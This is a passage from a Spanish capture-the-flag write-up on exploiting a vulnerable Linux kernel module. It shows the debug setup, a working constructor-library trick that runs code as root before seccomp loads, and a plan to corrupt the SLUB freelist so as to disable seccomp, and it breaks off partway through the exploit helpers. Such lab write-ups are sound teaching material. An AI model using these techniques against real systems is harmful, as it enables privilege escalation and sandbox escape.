+<span class="code-red">#</span> <span class="code-dark-green">cp</span> <span class="mtku">../initramfs.cpio.gz</span> <span class="mtku">.</span>
+
+<span class="code-red">#</span> <span class="code-dark-green">gunzip</span> <span class="mtku">./initramfs.cpio.gz</span>
+
+<span class="code-red">#</span> <span class="code-dark-green">cpio</span> -idm &lt; <span class="mtku">./initramfs.cpio</span>  
+10678 blocks
+
+<span class="code-red">#</span> <span class="code-dark-green">rm</span> <span class="mtku">initramfs.cpio</span>
+
+<span class="code-red">#</span> <span class="code-dark-green">tail</span> <span class="mtku">init</span>
+cat /etc/banner.txt
+
+insmod /chall/kebab_mod.ko
+
+chmod 4755 /chall/run
+
+cd /home/user
+setsid cttyhack setuidgid 1000 sh
+
+poweroff -f
+
+<span class="code-red">#</span> <span class="code-dark-green">vim</span> <span class="mtku">init</span>
+
+<span class="code-red">#</span> <span class="code-dark-green">tail</span> <span class="mtku">init</span>
+cat /etc/banner.txt
+
+insmod /chall/kebab_mod.ko
+
+chmod 4755 /chall/run
+
+cd /home/user
+setsid cttyhack setuidgid 0 sh
+
+poweroff -f
+</code></pre></div><p>Luego, cuando queramos probar el <em>exploit</em>, podemos usar un <em>script</em> como este (<code>go.sh</code>), que compila el programa en C, lo pone en el directorio <code>initramfs</code>, lo comprime y lo deja preparado para que <code>qemu</code> lo pueda usar mediante <code>run.sh</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env bash</span>
+
+<span class="mtk8">musl-gcc</span><span class="mtk1"> </span><span class="mtk6">-o</span><span class="mtk1"> </span><span class="mtk4">exploit</span><span class="mtk1"> </span><span class="mtk6">-static</span><span class="mtk1"> </span><span class="mtk9 mtki">$1</span> <span class="mtk5">||</span> <span class="mtk7">exit</span>
+<span class="mtk8">mv</span><span class="mtk1"> </span><span class="mtk4">exploit</span><span class="mtk1"> </span><span class="mtk4">initramfs</span>
+<span class="mtk7">cd</span><span class="mtk1"> </span><span class="mtk4">initramfs</span>
+<span class="mtk8">find</span><span class="mtk1"> </span><span class="mtk4">.</span><span class="mtk1"> </span><span class="mtk6">-print0</span><span class="mtk1"> </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk8">cpio</span><span class="mtk1"> </span><span class="mtk6">--null</span><span class="mtk1"> </span><span class="mtk6">-ov</span><span class="mtk1"> </span><span class="mtk6">--format=newc</span><span class="mtk1"> </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk8">gzip</span><span class="mtk1"> </span><span class="mtk6">-9</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk4">initramfs.cpio.gz</span>  
+<span class="mtk8">mv</span><span class="mtk1"> </span><span class="mtk4">initramfs.cpio.gz</span><span class="mtk1"> </span><span class="mtk4">..</span>
+<span class="mtk7">cd</span><span class="mtk1"> </span><span class="mtk4">..</span>
+
+<span class="mtk8">sh</span><span class="mtk1"> </span><span class="mtk4">run.sh</span>
+</code></pre></div><p>Por otro lado, el <em>exploit</em> lo compilamos estáticamente con <code>musl-gcc</code> porque genera compilados más pequeños y sin depender de librerías externas. Para esto es necesario instalarlo con <code>apt install musl-tools</code>.</p><p>Finalmente, le tenemos que añadir la opción <code>-s</code> al comando de <code>qemu</code> para poder depurar el kernel en remoto desde GDB en el puerto 1234 (por defecto). También es necesario comprobar las rutas a los archivos y directorios relevantes (<code>pc-bios</code>, <code>vmlinuz</code>, <code>initramfs.cpio.gz</code>).</p><p>Un archivo importante que debemos tener localizado para depurar con GDB es el módulo compilado:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">find</span> <span class="mtku">initramfs/</span> -name kebab\* 2&gt;<span class="mtku">/dev/null</span>  
+initramfs/chall/kebab_mod.ko
+</code></pre></div><p>En este punto, probamos un simple <em>Hello world</em> para ver si todo funciona correctamente:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">catn</span> <span class="mtku">exploit.c</span>; <span class="code-dark-green">sh</span> <span class="mtku">go.sh</span>
+#include &lt;stdio.h&gt;
+
+int main() {
+        printf("Hello, world!\n");
+
+        return 0;
+}
+
+...
+
+Booting from ROM..
+  ____         __       ____                     _
+ / ___|  __ _ / _| ___ / ___|_   _  __ _ _ __ __| |
+ \___ \ / _` | |_ / _ \ |  _| | | |/ _` | '__/ _` |
+  ___) | (_| |  _|  __/ |_| | |_| | (_| | | | (_| |
+ |____/ \__,_|_|  \___|\____|\__,_|\__,_|_|  \__,_|
+
+----------------------------------------------------  
+[+]            By DiegoAltF4 and Dbd4            [+]
+----------------------------------------------------
+
+/home/user # /exploit
+Hello, world!
+</code></pre></div><h3 id="peculiaridades">Peculiaridades</h3><p>La configuración anterior sirve para retos de explotación de kernel comunes. Sin embargo, para este reto tenemos algunos cambios.</p><p>Por ejemplo, vemos que si entramos como usuario no privilegiado (dejando <code>initramfs/init</code> como estaba al principio), vemos que el <em>device</em> vulnerable no es accesible:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/home/user $ ls -l /dev/safe_guard
+crw-------    1 root     root       10,  57 Feb 26 23:26 <span class="code-magenta">/dev/safe_guard</span>  
+</code></pre></div><p>Entonces, ¿cómo podemos explotar el <em>device</em> si no podemos abrirlo? Pues vamos a ver el archivo <code>initramfs/init</code> completo:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/sh</span>
+
+<span class="mtk8">chown</span><span class="mtk1"> </span><span class="mtk6">-hR</span><span class="mtk1"> </span><span class="mtk4">root:</span><span class="mtk1"> </span><span class="mtk4">/</span>
+<span class="mtk8">chown</span><span class="mtk1"> </span><span class="mtk6">-R</span><span class="mtk1"> </span><span class="mtk4">user:</span><span class="mtk1"> </span><span class="mtk4">/home/user</span>
+
+<span class="mtk8">chmod</span><span class="mtk1"> </span><span class="mtk6">0755</span><span class="mtk1"> </span><span class="mtk6">-R</span><span class="mtk1"> </span><span class="mtk4">/</span>
+<span class="mtk8">chmod</span><span class="mtk1"> </span><span class="mtk6">0700</span><span class="mtk1"> </span><span class="mtk6">-R</span><span class="mtk1"> </span><span class="mtk4">/root/</span>
+
+<span class="mtk8">mount</span><span class="mtk1"> </span><span class="mtk6">-t</span><span class="mtk1"> </span><span class="mtk4">proc</span><span class="mtk1"> </span><span class="mtk4">none</span><span class="mtk1"> </span><span class="mtk4">/proc</span>
+<span class="mtk8">mount</span><span class="mtk1"> </span><span class="mtk6">-t</span><span class="mtk1"> </span><span class="mtk4">sysfs</span><span class="mtk1"> </span><span class="mtk4">none</span><span class="mtk1"> </span><span class="mtk4">/sys</span>
+<span class="mtk8">mount</span><span class="mtk1"> </span><span class="mtk6">-t</span><span class="mtk1"> </span><span class="mtk4">devtmpfs</span><span class="mtk1"> </span><span class="mtk4">none</span><span class="mtk1"> </span><span class="mtk4">/dev</span>
+<span class="mtk8">mkdir</span><span class="mtk1"> </span><span class="mtk6">-p</span><span class="mtk1"> </span><span class="mtk4">/dev/pts</span>
+<span class="mtk8">mount</span><span class="mtk1"> </span><span class="mtk6">-vt</span><span class="mtk1"> </span><span class="mtk4">devpts</span><span class="mtk1"> </span><span class="mtk6">-o</span><span class="mtk1"> </span><span class="mtk4">gid=</span><span class="mtk6">4</span><span class="mtk4">,mode=</span><span class="mtk6">620</span><span class="mtk1"> </span><span class="mtk4">none</span><span class="mtk1"> </span><span class="mtk4">/dev/pts</span>  
+
+<span class="mtk8">/sbin/mdev</span><span class="mtk1"> </span><span class="mtk6">-s</span>
+
+<span class="mtk8">ifup</span><span class="mtk1"> </span><span class="mtk4">eth0</span><span class="mtk1"> </span><span class="mtk5">&gt;&amp;</span><span class="mtk1"> </span><span class="mtk4">/dev/null</span>
+
+<span class="mtk7">cd</span><span class="mtk1"> </span><span class="mtk4">/root</span>
+<span class="mtk8">cat</span><span class="mtk1"> </span><span class="mtk4">/etc/banner.txt</span>
+
+<span class="mtk8">insmod</span><span class="mtk1"> </span><span class="mtk4">/chall/kebab_mod.ko</span>
+
+<span class="mtk8">chmod</span><span class="mtk1"> </span><span class="mtk6">4755</span><span class="mtk1"> </span><span class="mtk4">/chall/run</span>
+
+<span class="mtk7">cd</span><span class="mtk1"> </span><span class="mtk4">/home/user</span>
+<span class="mtk8">setsid</span><span class="mtk1"> </span><span class="mtk4">cttyhack</span><span class="mtk1"> </span><span class="mtk4">setuidgid</span><span class="mtk1"> </span><span class="mtk6">1000</span><span class="mtk1"> </span><span class="mtk4">sh</span>
+
+<span class="mtk8">poweroff</span><span class="mtk1"> </span><span class="mtk6">-f</span>
+</code></pre></div><p>Ahí está la trampa. Tenemos un binario SUID en <code>/chall/run</code>, así que vamos a analizarlo en Ghidra:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> iVar1;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">int</span><span class="mtk1"> iVar2;</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">long</span><span class="mtk1"> lVar3;</span>
+<span class="mtk1">  code </span><span class="mtk5">*</span><span class="mtk1">pcVar4;</span>
+
+<span class="mtk1">  iVar1 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/dev/safe_guard"</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (iVar1 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">__assert_fail</span><span class="mtk1">(</span><span class="mtk4">"fd != -1"</span><span class="mtk1">, </span><span class="mtk4">"run.c"</span><span class="mtk1">, </span><span class="mtk6">9</span><span class="mtk1">, (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1">__PRETTY_FUNCTION__.</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  lVar3 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">dlopen</span><span class="mtk1">(</span><span class="mtk4">"/home/user/libxpl.so"</span><span class="mtk1">, </span><span class="mtk6">2</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (lVar3 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">__assert_fail</span><span class="mtk1">(</span><span class="mtk4">"handle != 0"</span><span class="mtk1">, </span><span class="mtk4">"run.c"</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">c</span><span class="mtk1">, (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1">__PRETTY_FUNCTION__.</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  pcVar4 </span><span class="mtk5">=</span><span class="mtk1"> (code </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk8">dlsym</span><span class="mtk1">(lVar3, </span><span class="mtk4">"exploit"</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (pcVar4 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">NULL</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">__assert_fail</span><span class="mtk1">(</span><span class="mtk4">"exploit != 0"</span><span class="mtk1">, </span><span class="mtk4">"run.c"</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">e</span><span class="mtk1">, (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1">__PRETTY_FUNCTION__.</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  lVar3 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">seccomp_init</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (lVar3 </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">__assert_fail</span><span class="mtk1">(</span><span class="mtk4">"ctx != 0"</span><span class="mtk1">, </span><span class="mtk4">"run.c"</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">11</span><span class="mtk1">, (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1">__PRETTY_FUNCTION__.</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  iVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">seccomp_rule_add</span><span class="mtk1">(lVar3, </span><span class="mtk5">0x</span><span class="mtk6">7fff0000</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">10</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (iVar2 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">__assert_fail</span><span class="mtk1">(</span><span class="mtk4">"seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(io</span><span class="mtk4">ctl), 0) == 0"</span><span class="mtk1">, </span><span class="mtk4">"run.c"</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">13</span><span class="mtk1">, (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1">__PRETTY_FUNCTION__.</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  iVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">seccomp_rule_add</span><span class="mtk1">(lVar3, </span><span class="mtk5">0x</span><span class="mtk6">7fff0000</span><span class="mtk1">, </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (iVar2 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">__assert_fail</span><span class="mtk1">(</span><span class="mtk4">"seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(wr</span><span class="mtk4">ite), 0) == 0"</span><span class="mtk1">, </span><span class="mtk4">"run.c"</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">14</span><span class="mtk1">, (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1">__PRETTY_FUNCTION__.</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  iVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">seccomp_rule_add</span><span class="mtk1">(lVar3, </span><span class="mtk5">0x</span><span class="mtk6">7fff0000</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">106</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (iVar2 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">__assert_fail</span><span class="mtk1">(</span><span class="mtk4">"seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(ne</span><span class="mtk4">wfstatat), 0) == 0"</span><span class="mtk1">, </span><span class="mtk4">"run.c"</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">15</span><span class="mtk1">, (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1">__PRETTY_FUNCTION__.</span><span class="mtk6">0</span><span class="mtk1">);</span>  
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  iVar2 </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">seccomp_load</span><span class="mtk1">(lVar3);</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (iVar2 </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">__assert_fail</span><span class="mtk1">(</span><span class="mtk4">"seccomp_load(ctx) == 0"</span><span class="mtk1">, </span><span class="mtk4">"run.c"</span><span class="mtk1">, </span><span class="mtk5">0x</span><span class="mtk6">16</span><span class="mtk1">, (</span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk5">&amp;</span><span class="mtk1">__PRETTY_FUNCTION__.</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  (</span><span class="mtk5">*</span><span class="mtk1">pcVar4)(iVar1);</span>
+
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Ahora tiene mucho más sentido. La manera de ejecutar el <em>exploit</em> es llamando al binario SUID <code>/chall/run</code>, que abrirá el <em>device</em> vulnerable (como se ejecuta en el contexto de <code>root</code>, no hay problema). Luego, el binario carga una librería desde <code>/home/user/libxpl.so</code> y ejecuta una función <code>exploit</code> de la misma librería.</p><p>Entonces, tenemos que cambiar ligeramente el archivo <code>go.sh</code> para compilar el <em>exploit</em> como librería:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/usr/bin/env bash</span>
+
+<span class="mtk8">gcc</span><span class="mtk1"> </span><span class="mtk6">-s -fPIC -o</span><span class="mtk1"> </span><span class="mtk4">libxpl.so</span><span class="mtk1"> </span><span class="mtk6">-shared</span><span class="mtk1"> </span><span class="mtk9 mtki">$1</span> <span class="mtk5">||</span> <span class="mtk7">exit</span>
+<span class="mtk8">mv</span><span class="mtk1"> </span><span class="mtk4">libxpl.so</span><span class="mtk1"> </span><span class="mtk4">initramfs/home/user</span>
+<span class="mtk7">cd</span><span class="mtk1"> </span><span class="mtk4">initramfs</span>
+<span class="mtk8">find</span><span class="mtk1"> </span><span class="mtk4">.</span><span class="mtk1"> </span><span class="mtk6">-print0</span><span class="mtk1"> </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk8">cpio</span><span class="mtk1"> </span><span class="mtk6">--null</span><span class="mtk1"> </span><span class="mtk6">-ov</span><span class="mtk1"> </span><span class="mtk6">--format=newc</span><span class="mtk1"> </span><span class="mtk5">|</span><span class="mtk1"> </span><span class="mtk8">gzip</span><span class="mtk1"> </span><span class="mtk6">-9</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk4">initramfs.cpio.gz</span>  
+<span class="mtk8">mv</span><span class="mtk1"> </span><span class="mtk4">initramfs.cpio.gz</span><span class="mtk1"> </span><span class="mtk4">..</span>
+<span class="mtk7">cd</span><span class="mtk1"> </span><span class="mtk4">..</span>
+
+<span class="mtk8">sh</span><span class="mtk1"> </span><span class="mtk4">run.sh</span>
+</code></pre></div><p>Además, el programa <code>/chall/run</code> establece unas reglas <code>seccomp</code> después de cargar la librería. Solamente nos permite usar dos instrucciones <code>syscall</code>: <code>sys_write</code> y <code>sys_newfstatat</code>.</p><p>Nótese que al ejecutar el binario SUID <code>/chall/run</code> ya somos <code>root</code>. El problema es que estamos bajo las reglas de <code>seccomp</code>. Por este motivo, no podríamos simplemente leer la <em>flag</em> de <code>/root/flag</code>, ya que para eso necesitaríamos usar instrucciones como <code>sys_open</code> y <code>sys_write</code>, y no están permitidas. Entonces, el objetivo del reto es encontrar una manera de saltarnos las reglas <code>seccomp</code> mediante alguna vulnerabilidad del módulo de kernel que nos dan.</p><h2 id="solución-no-intencionada">Solución no intencionada</h2><p>Antes de comenzar con el <em>exploit</em> de kernel, descubrí una solución no intencionada. El punto clave está en la instrucción <code>dlopen</code> del binario SUID <code>/chall/run</code>. Existen maneras de ejecutar una función justo al cargarse una librería. Si conseguimos esto, estaremos ejecutando código como <code>root</code> antes de tener las reglas <code>seccomp</code> habilitadas.</p><p>Un código en C como el siguiente funciona para leer la <em>flag</em>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">#include</span><span class="mtk1"> </span><span class="mtk4">&lt;stdlib.h&gt;</span>
+<span class="mtk5">#include</span><span class="mtk1"> </span><span class="mtk4">&lt;stdio.h&gt;</span>
+
+<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">__attribute__</span><span class="mtk1"> ((constructor)) </span><span class="mtk8">init</span><span class="mtk1">() {</span>  
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> flag[</span><span class="mtk6">256</span><span class="mtk1">];</span>
+<span class="mtk1">  FILE </span><span class="mtk5">*</span><span class="mtk1">fp;</span>
+
+<span class="mtk1">  fp </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fopen</span><span class="mtk1">(</span><span class="mtk4">"/root/flag"</span><span class="mtk1">, </span><span class="mtk4">"r"</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">fgets</span><span class="mtk1">(flag, </span><span class="mtk6">256</span><span class="mtk1">, fp);</span>
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(flag);</span>
+<span class="mtk1">  </span><span class="mtk8">fclose</span><span class="mtk1">(fp);</span>
+
+<span class="mtk1">  </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">0</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Ahora, lanzamos <code>qemu</code> y ejecutamos <code>/chall/run</code> (incluso con el <em>script</em> original de <code>initramfs/init</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">#</span> <span class="code-dark-green">sh</span> <span class="mtku">go.sh</span> <span class="mtku">unintended.c</span>
+.
+./home
+./home/user
+./home/user/libxpl.so
+
+...
+
+Booting from ROM..
+  ____         __       ____                     _
+ / ___|  __ _ / _| ___ / ___|_   _  __ _ _ __ __| |
+ \___ \ / _` | |_ / _ \ |  _| | | |/ _` | '__/ _` |
+  ___) | (_| |  _|  __/ |_| | |_| | (_| | | | (_| |
+ |____/ \__,_|_|  \___|\____|\__,_|\__,_|_|  \__,_|
+
+----------------------------------------------------  
+[+]            By DiegoAltF4 and Dbd4            [+]
+----------------------------------------------------
+
+/home/user $ /chall/run
+flag{fake_flag}
+</code></pre></div><h2 id="estrategia-de-explotación">Estrategia de explotación</h2><p>Después de analizar el código, lo que tenemos es lo siguiente:</p><ul><li>Posibilidad de asignar hasta 4 <em>chunks</em> de tamaños menores o iguales que 2048 bytes</li><li>El contenido de los <em>chunks</em> está cifrado con RC4. Pero como es un cifrado en flujo y nosotros ponemos la clave, no tenemos limitación en qué escribir</li><li>Tenemos un <em>off-by-one</em> en la función de cifrado RC4</li></ul><p>La idea es la siguiente: el kernel utiliza por defecto un asignador de memoria conocido como SLUB. En este contexto existen listas (<em>slabs</em>) que contienen objetos (<em>chunks</em>) del mismo tamaño que se asignan de manera adyacente.</p><p>En estas <em>slabs</em>, cuando un objeto está liberado, contiene un puntero al comienzo que apunta al siguiente objeto libre. Entonces, a la hora de asignar un nuevo objeto en una <em>slab</em> determinada, primero se mira la lista enlazada (<code>freelist</code>) para ocupar objetos que ya fueron asignados pero están libres. Y entonces, se actualiza la lista estableciendo una nueva cabeza de lista enlazada.</p><p>Como resultado, para explotar el <em>off-by-one</em>, podemos modificar el puntero al siguiente objeto libre en el objeto adyacente al que estamos creando. Así, estaremos corrompiendo la lista enlazada y, al asignar nuevos objetos, podremos conseguir un objeto que se solape con otro que controlamos.</p><p>Como no tenemos opción para liberar objetos, pondremos un objeto que parezca que está liberado, y haremos que la <code>freelist</code> apunte a este objeto, de manera que controlamos la dirección donde se escribirá el siguiente objeto. Y así, logramos una primitiva de escritura arbitraria.</p><p>Una vez podamos escribir en memoria, la idea es desactivar las reglas <code>seccomp</code>. Para esto, tenemos que modificar el atributo <code>current->thread_info.flags</code>, como se muestra en <a href="https://keksite.in/posts/Seccomp-Bypass/">keksite.in</a>. Es el bit 8 el que indica al proceso que existen reglas <code>seccomp</code> habilitadas, por lo que simplemente tenemos que poner <code>0</code> en este bit y listo, ya podemos leer la flag e incluso conseguir una <em>shell</em> como <code>root</code> de la manera intencionada.</p><p>La definición de la estructura <code>task_struct</code> la podemos ver en <a href="https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L746">elixir.bootlin.com</a>, y vemos que el primer atributo es <code>thread_info</code>, cuyo primer atributo es <code>flags</code> (<a href="https://elixir.bootlin.com/linux/latest/source/arch/x86/include/asm/thread_info.h#L56%5D">elixir.bootlin.com</a>). Entonces, como el módulo nos da un puntero a <code>current</code>, que se corresponde con la estructura <code>task_struct</code> del proceso actual, simplemente tenemos que modificar el bit 8 relativo a la dirección de <code>current</code>.</p><h2 id="desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></h2><p>Para poder depurar mientras hacemos el <em>exploit</em>, es necesario modificar el archivo <code>initranfs/init</code> para entrar al sistema como <code>root</code>. Así, no solamente podremos abrir el <em>device</em> vulnerable, sino que podremos leer las direcciones del kernel en <code>/proc/kallsyms</code>. El <em>exploit</em> que haremos de prueba no utilizará <code>/chall/run</code>, y así podemos usar funciones como <code>getchar</code> para depurar con GDB sin que <code>seccomp</code> nos bloquee.</p><p>Podemos definir las siguientes funciones auxiliares para interactuar con el módulo:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">int</span><span class="mtk1"> fd;</span>
+
+
+<span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">open_device</span><span class="mtk1">() {</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ((fd </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">open</span><span class="mtk1">(</span><span class="mtk4">"/dev/safe_guard"</span><span class="mtk1">, O_RDONLY)) </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>  
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[!] Failed to open device"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">exit</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">);</span>
+<span class="mtk1">  } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[*] Opened device"</span><span class="mtk1">);</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+
+
+<span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">ioctl_new</span><span class="mtk1">(</span><span class="mtk7 mtki">struct</span><span class="mtk1"> new_secbuff_arg</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">arg</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">ioctl</span><span class="mtk1">(fd, KEBAB_IOCTL_NEW, arg);</span>
+<span class="mtk1">}</span>
+
+
+<span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk8">ioctl_set_key</span><span class="mtk1">(</span><span class="mtk7 mtki">char</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">key</span><span class="mtk1">, </span><span class="mtk7 mtki">struct</span><span class="mtk1"> key_info</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk9 mtki">ki</span><span class="mtk1">) {</span>
